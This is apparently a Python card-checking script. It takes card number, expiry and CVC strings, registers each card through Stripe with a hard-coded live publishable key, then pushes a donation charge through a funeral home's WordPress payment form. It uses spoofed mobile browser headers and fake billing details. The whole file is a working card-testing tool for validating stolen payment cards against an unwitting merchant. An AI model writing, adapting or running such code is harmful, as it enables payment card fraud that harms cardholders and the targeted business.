import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 4)
	random_amount2 = random.randint(1, 99)

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Kuroshio&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&key=pk_live_51JNN5kCPT27SWWccxqzoGW8uBAVSg8XaS1aFtpbAD8nRcPLmqOyajKoGVA3Pfh9mgZ7EBGaro0mS9BrLxwO2yCmH00ssRNida2'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'Accept': 'application/json, text/javascript, */*; q=0.01',
	    'Accept-Language': 'en-US,en;q=0.9',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'Origin': 'https://brendanennisfunerals.ie',
	    'Referer': 'https://brendanennisfunerals.ie/pay-funeral-account/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'action': 'wp_full_stripe_inline_donation_charge',
	    'wpfs-form-name': 'pay-funeral-account',
	    'wpfs-form-get-parameters': '%7B%7D',
	    'wpfs-custom-amount': 'other',
	    'wpfs-custom-amount-unique': '1',
	    'wpfs-donation-frequency': 'one-time',
	    'wpfs-custom-input[]': [
	        'Kuroshio',
	        '27 Allen St',
	        '9075613805',
	    ],
	    'wpfs-card-holder-email': 'emoji2292299@gmail.com',
	    'wpfs-card-holder-name': 'Kuroshio',
	    'wpfs-stripe-payment-method-id': f'{pm}',
	}
	
	response = requests.post('https://brendanennisfunerals.ie/wp-admin/admin-ajax.php', headers=headers, data=data)
	
	result = response.json()['message']
	
	return result
